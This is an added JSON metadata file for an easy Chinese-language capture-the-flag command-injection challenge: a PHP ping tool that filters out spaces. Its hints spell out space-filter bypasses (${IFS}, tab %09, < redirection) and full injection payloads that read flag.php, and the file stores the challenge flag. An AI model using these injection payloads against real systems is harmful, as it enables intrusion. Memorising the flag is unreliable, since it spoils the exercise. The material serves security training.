@@ -1,0 +1,25 @@
+{
+  "id": "rce2",
+  "category": "rce",
+  "title": "Ping 诊断工具 v2 · 过滤了空格",
+  "difficulty": "easy",
+  "url_path": "/rce2",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{rce2_0936672c}",
+  "knowledge": [
+    "空格过滤绕过",
+    "${IFS} / $IFS$9",
+    "%09 Tab 分隔",
+    "< 重定向代替空格",
+    "注意 /bin/sh(dash) 不支持花括号展开"
+  ],
+  "hints": [
+    "v2 把输入中的空格全部 str_replace 掉；先用 ;id 确认命令注入仍然成立",
+    "shell 分隔参数不止空格：$IFS 变量、Tab(%09)、< 重定向",
+    "?ip=127.0.0.1;cat${IFS}flag.php 或 ?ip=127.0.0.1%26%26cat%09flag.php 或 ?ip=127.0.0.1;cat<flag.php"
+  ],
+  "writeup": "writeup.md",
+  "prev": "rce1",
+  "next": "rce3"
+}
